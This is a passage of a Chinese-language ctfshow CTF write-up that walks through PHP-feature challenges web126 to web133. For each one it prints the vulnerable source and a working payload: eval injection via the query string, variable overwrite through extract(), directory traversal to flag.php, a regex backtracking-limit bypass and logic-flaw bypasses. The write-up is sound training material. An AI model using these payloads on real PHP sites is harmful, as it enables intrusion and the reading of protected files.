</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;CTF_SHOW&#39;</span><span class="p">])</span><span class="o">&amp;&amp;</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;CTF_SHOW.COM&#39;</span><span class="p">])</span><span class="o">&amp;&amp;!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;fl0g&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/</span><span class="se">\\\\</span><span class="s2">|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|</span><span class="se">\&#34;</span><span class="s2">|\&#39;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$c</span><span class="p">)</span><span class="o">&lt;=</span><span class="mi">16</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">         <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$c</span><span class="s2">&#34;</span><span class="o">.</span><span class="s2">&#34;;&#34;</span><span class="p">);</span>  
</span></span><span class="line"><span class="ln">20</span><span class="cl">         <span class="k">if</span><span class="p">(</span><span class="nv">$fl0g</span><span class="o">===</span><span class="s2">&#34;flag_give_me&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">             <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">         <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>基本上ban掉了能读文件的函数</p>
<p>参考<a href="https://blog.csdn.net/Myon5/article/details/140464776">ctfshow-web入门-php特性（web123、web125、web126）_ctfshow web123-CSDN博客</a></p>
<p>payload:</p>
<pre tabindex="0"><code>get：?$fl0g=flag_give_me;
post：CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=eval($a[0])
or
GET:?$fl0g=flag_give_me
POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=assert($a[0])
</code></pre><p>这里的查询字符串没有包含 fl0g，但包含了 $fl0g。由于 PHP 中的变量名不包括 $ 符号，所以 isset($_GET[&lsquo;fl0g&rsquo;]) 仍然会返回 false，即没有检测到 fl0g 参数。</p>
<p>post 传入 CTF_SHOW 和 CTF_SHOW.COM 确保 isset($_POST[&lsquo;CTF_SHOW&rsquo;]) &amp;&amp; isset($_POST[&lsquo;CTF_SHOW.COM&rsquo;]) 这部分条件为真，fun=eval($a[0]) 将 eval($a[0]) 的代码传递给 $c。</p>
<p>准确来说，此时的 $_SERVER[‘argv’][0] 就等于 $_SERVER[‘QUERY_STRING’]，$_SERVER[&ldquo;QUERY_STRING&rdquo;] 就是查询 (query) 的字符串，这是由于 php.ini 开启了register_argc_argv 配置项。</p>
<p>当访问 ?$fl0g=flag_give_me; 时，服务器配置使得查询字符串被传递到 $_SERVER[&lsquo;argv&rsquo;] 中。
在这种配置下，$_SERVER[&lsquo;argv&rsquo;][0] 包含了整个查询字符串，即 &lsquo;$fl0g=flag_give_me;&rsquo;。</p>
<p>在 eval(&quot;$c;&rdquo;); 中实际执行的是 eval(&rsquo;eval($a[0]);&rsquo;);，因为 $a[0] 是 &lsquo;$fl0g=flag_give_me;&rsquo;，这相当于执行了 eval(&rsquo;$fl0g=flag_give_me;&rsquo;);，这样就定义了变量 $fl0g 并赋值为 &lsquo;flag_give_me&rsquo;。</p>
<p>最后 判断 if($fl0g === &ldquo;flag_give_me&rdquo;)，因为 $fl0g 被正确地设置为了 &lsquo;flag_give_me&rsquo;，所以这个条件为真，因此，echo $flag; 被执行，输出 $flag。</p>
<p>其他payload:</p>
<pre tabindex="0"><code>GET:?a=1+fl0g=flag_give_me
POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])
</code></pre><p>也同样是为了使fl0g=flag_give_me</p>
<h4 id="web127">web127<a hidden class="anchor" aria-hidden="true" href="#web127">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-10 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-10 21:52:49
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nv">$ctf_show</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$flag</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="c1">//特殊字符检测
</span></span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="c1"></span><span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$url</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\{|\;|\:|\[|\]|\}|\&#39;|\&#34;|\&lt;|\,|\&gt;|\.|\\\|\//&#39;</span><span class="p">,</span> <span class="nv">$url</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">
</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">waf</span><span class="p">(</span><span class="nv">$url</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;嗯哼？&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">    <span class="nx">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">
</span></span><span class="line"><span class="ln">35</span><span class="cl">
</span></span><span class="line"><span class="ln">36</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$ctf_show</span><span class="o">===</span><span class="s1">&#39;ilove36d&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>变量覆盖</p>
<p>由于下划线被waf了，我们可以传ctf%20show，php会将空格解析成_</p>
<p>payload:</p>
<pre tabindex="0"><code>ctf%20show=ilove36d
</code></pre><h4 id="web128">web128<a hidden class="anchor" aria-hidden="true" href="#web128">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-10 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-12 19:49:05
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nv">$f1</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="nv">$f2</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">check</span><span class="p">(</span><span class="nv">$f1</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">var_dump</span><span class="p">(</span><span class="nx">call_user_func</span><span class="p">(</span><span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$f1</span><span class="p">,</span><span class="nv">$f2</span><span class="p">)));</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;嗯哼？&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl">
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="k">function</span> <span class="nf">check</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="k">return</span> <span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[0-9]|[a-z]/i&#39;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="p">}</span> 
</span></span></code></pre></div><p>什么是Gettext函数</p>
<p><a href="https://www.php.net/manual/zh/book.gettext.php">PHP: Gettext - Manual</a></p>
<p>骚操作</p>
<pre tabindex="0"><code>小知识点： _()是一个函数

_()==gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll

get_defined_vars()函数

get_defined_vars — 返回由所有已定义变量所组成的数组 这样可以获得 $flag

payload: ?f1=_&amp;f2=get_defined_vars
</code></pre><h4 id="web129">web129<a hidden class="anchor" aria-hidden="true" href="#web129">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-13 03:18:40
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$f</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">stripos</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="s1">&#39;ctfshow&#39;</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">echo</span> <span class="nx">readfile</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>stripos() 函数查找字符串在另一字符串中第一次出现的位置</p>
<p>所以我们要考虑在ctfshow前面放点什么，但又不影响我们读文件</p>
<p>可以联想到目录穿越</p>
<p>payload:</p>
<pre tabindex="0"><code>/ctfshow/../../../../../../../../../../var/www/html/flag.php
</code></pre><h4 id="web130">web130<a hidden class="anchor" aria-hidden="true" href="#web130">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-13 05:19:40
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$f</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/.+?ctfshow/is&#39;</span><span class="p">,</span> <span class="nv">$f</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;bye!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">stripos</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="s1">&#39;ctfshow&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">FALSE</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;bye!!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><blockquote>
<p>&lsquo;/.+?ctfshow/is&rsquo; 后面的i表示大小写匹配，s表示忽略换行符，单行匹配</p>
<p>在不加转义字符的前提下，前面的点表示任意字符，而“+?”表示非贪婪匹配，即前面的字符至少出现一次</p>
<p>所以，该正则匹配的意思为：ctfshow前面如果出现任意字符，即匹配准确</p>
<p>再根据下面的stripos为字符串匹配函数，要求输入的参数必须有“ctfshow”字符，所以输入的参数只需要满足ctfshow前面不加任意字符即可</p></blockquote>
<p>payload</p>
<pre tabindex="0"><code>POST f=ctfshow
</code></pre><h4 id="web131">web131<a hidden class="anchor" aria-hidden="true" href="#web131">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-13 05:19:40
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$f</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/.+?ctfshow/is&#39;</span><span class="p">,</span> <span class="nv">$f</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;bye!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">stripos</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="s1">&#39;36Dctfshow&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">FALSE</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;bye!!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>正则表达式溢出 <a href="https://www.laruence.com/2010/06/08/1579.html">https://www.laruence.com/2010/06/08/1579.html</a></p>
<p>payload:</p>
<pre tabindex="0"><code>#payload:
&lt;?php
echo str_repeat(&#39;very&#39;, &#39;250000&#39;).&#39;36Dctfshow&#39;;
</code></pre><p>不宜过多，过多会</p>
<p><img alt="image-20250124131836252" loading="lazy" src="assets/image-20250124131836252.png"></p>
<h4 id="web132">web132<a hidden class="anchor" aria-hidden="true" href="#web132">#</a></h4>
<p><img alt="image-20250124132332538" loading="lazy" src="assets/image-20250124132332538.png"></p>
<p><img alt="image-20250124132344174" loading="lazy" src="assets/image-20250124132344174.png"></p>
<p>/admin</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 06:22:13
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-13 20:05:36
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">#error_reporting(0);
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="nv">$username</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nv">$password</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nv">$code</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$code</span> <span class="o">===</span> <span class="nx">mt_rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x36D</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$password</span> <span class="o">===</span> <span class="nv">$flag</span> <span class="o">||</span> <span class="nv">$username</span> <span class="o">===</span><span class="s2">&#34;admin&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$code</span> <span class="o">==</span> <span class="s1">&#39;admin&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">            <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">        
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>第一个判断后面用的是或</p>
<p>也就是说只要使username等于admin即可，前面两个无所谓了</p>
<p>第二个判断让code等于admin即可</p>
<p>payload：</p>
<pre tabindex="0"><code>GET:?code=admin&amp;username=admin&amp;password=
</code></pre><h4 id="web133">web133<a hidden class="anchor" aria-hidden="true" href="#web133">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
